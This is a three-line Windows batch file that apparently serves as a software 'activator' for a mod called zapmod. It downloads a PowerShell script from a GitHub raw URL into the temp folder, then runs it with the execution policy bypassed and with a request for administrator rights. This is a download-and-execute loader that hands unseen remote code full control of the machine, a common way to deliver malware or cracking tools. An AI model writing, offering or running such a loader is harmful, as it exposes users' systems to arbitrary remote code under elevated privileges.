@echo off
PowerShell -Command "& {Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Pugn0/zapmod-activator/main/activator.ps1' -OutFile '%TEMP%\zapmod.ps1'}"
PowerShell -ExecutionPolicy Bypass -Command "Start-Process PowerShell -ArgumentList '-ExecutionPolicy Bypass -File ""%TEMP%\zapmod.ps1""' -Verb RunAs"
